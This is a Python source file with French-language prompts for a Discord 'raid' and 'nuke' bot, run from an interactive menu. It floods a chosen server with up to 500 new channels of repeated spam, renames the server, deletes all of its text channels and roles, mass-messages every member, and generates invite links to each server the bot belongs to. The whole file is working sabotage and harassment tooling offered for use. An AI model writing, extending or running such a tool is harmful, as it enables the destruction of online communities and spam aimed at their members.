import discord
import asyncio

intents = discord.Intents.default()
intents.members = True

client = discord.Client(intents=intents)

async def spam_channels(guild, channel_name, message, num_channels, repeat_count):
    print(f"Création de {num_channels} salons '{channel_name}' dans le serveur {guild.name}")

    tasks = []
    for i in range(num_channels):
        tasks.append(create_and_send_message(guild, channel_name, message, i+1, repeat_count))
    
    await asyncio.gather(*tasks)
    print(f"{num_channels} salons créés avec succès dans le serveur {guild.name}")

async def create_and_send_message(guild, channel_name, message, index, repeat_count):
    channel = await guild.create_text_channel(f"{channel_name}-{index}")
    print(f"Salon '{channel.name}' créé dans le serveur {guild.name}")

    if message.strip():
        for _ in range(repeat_count):
            await channel.send(message)
            await asyncio.sleep(0.5)
    else:
        print(f"Message vide pour le salon '{channel.name}', aucun message envoyé.")

async def list_servers():
    print("Affichage des serveurs et invitations :")
    for guild in client.guilds:
        if guild.text_channels:
            invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1)
            print(f"Nom du serveur : {guild.name}")
            print(f"ID du serveur : {guild.id}")
            print(f"Invitation : {invite.url}")
            print("--------------------------")
        else:
            print(f"Le serveur '{guild.name}' n'a pas de salons textuels.")
            print("--------------------------")

async def nuke_server(guild):
    print(f"En train de nettoyer le serveur {guild.name} ...")

    for channel in guild.text_channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            print(f"Impossible de supprimer le salon {channel.name} car le bot n'a pas les permissions nécessaires.")
        except Exception as e:
            print(f"Une erreur s'est produite lors de la suppression du salon {channel.name} : {e}")

    for role in guild.roles:
        try:
            await role.delete()
        except discord.Forbidden:
            print(f"Impossible de supprimer le rôle {role.name} car le bot n'a pas les permissions nécessaires.")
        except discord.HTTPException as e:
            print(f"Une erreur s'est produite lors de la suppression du rôle {role.name} : {e}")

    print(f"Nettoyage terminé pour le serveur {guild.name}.")

async def dm_all_members(guild, message):
    print(f"Envoi de messages directs à tous les membres du serveur {guild.name}")
    for member in guild.members:
        if member.bot:
            continue
        try:
            await member.send(message)
            print(f"Message envoyé à {member.name}")
        except discord.Forbidden:
            print(f"Impossible d'envoyer un message à {member.name}, permission refusée.")
        except Exception as e:
            print(f"Une erreur s'est produite lors de l'envoi d'un message à {member.name} : {e}")

async def main_menu():
    while True:
        print("\nBienvenue ! Voici les options disponibles :")
        print("1. Raid serveur")
        print("2. Liste des serveurs et invitations")
        print("3. Nuke le serveur (efface tous les salons et rôles)")
        print("4. Mass Dm Membre D'un Serveur")
        choice = input("Entrez votre choix (1, 2, 3 ou 4) : ")

        if choice == '1':
            guild_id_input = input("Entrez l'ID du serveur où créer les salons : ")
            guild_id = int(guild_id_input) if guild_id_input.strip() else None
            
            guild = client.get_guild(guild_id)
            if guild is None:
                print(f"Impossible de trouver le serveur avec l'ID {guild_id}")
                continue
            
            channel_name = input("Entrez le nom du salon à créer : ")
            message = input("Entrez le message à envoyer dans chaque salon : ")
            
            num_channels_input = input("Combien de salons souhaitez-vous créer (Maximum 500) ? : ")
            num_channels = min(int(num_channels_input) if num_channels_input.strip() else 1, 500)
            
            repeat_count_input = input("Combien de fois envoyer le message dans chaque salon ? : ")
            repeat_count = int(repeat_count_input) if repeat_count_input.strip() else 1
            
            change_guild_name = input("Voulez-vous changer le nom du serveur ? (oui/non) : ").strip().lower()
            
            if change_guild_name == "oui":
                new_guild_name = input(f"Entrez le nouveau nom pour le serveur '{guild.name}' : ").strip()
                if new_guild_name:
                    try:
                        await guild.edit(name=new_guild_name)
                        print(f"Nom du serveur changé en '{new_guild_name}'")
                    except discord.Forbidden:
                        print("Le bot n'a pas la permission de changer le nom du serveur.")
                else:
                    print("Nom du serveur non modifié.")
            elif change_guild_name == "non":
                print("Nom du serveur non modifié.")
            else:
                print("Choix invalide. Nom du serveur non modifié.")

            await spam_channels(guild, channel_name, message, num_channels, repeat_count)
            print("Retour au menu principal...")
                
        elif choice == '2':
            await list_servers()
            print("Retour au menu principal...")
        elif choice == '3':
            guild_id_input = input("Entrez l'ID du serveur à nettoyer : ")
            guild_id = int(guild_id_input) if guild_id_input.strip() else None
            
            guild = client.get_guild(guild_id)
            if guild is None:
                print(f"Impossible de trouver le serveur avec l'ID {guild_id}")
                continue
            
            await nuke_server(guild)
            print("Retour au menu principal...")
        elif choice == '4':
            guild_id_input = input("Entrez l'ID du serveur où envoyer des DM : ")
            guild_id = int(guild_id_input) if guild_id_input.strip() else None
            
            guild = client.get_guild(guild_id)
            if guild is None:
                print(f"Impossible de trouver le serveur avec l'ID {guild_id}")
                continue

            message = input("Entrez le message à envoyer à tous les membres : ")
            await dm_all_members(guild, message)
            print("Retour au menu principal...")
        else:
            print("Choix invalide. Veuillez entrer 1, 2, 3 ou 4.")

@client.event
async def on_ready():
    print(f"Bot connecté en tant que {client.user}")
    await main_menu()

if __name__ == "__main__":
    token = input("Entrez le token du bot : ")
    client.run(token)
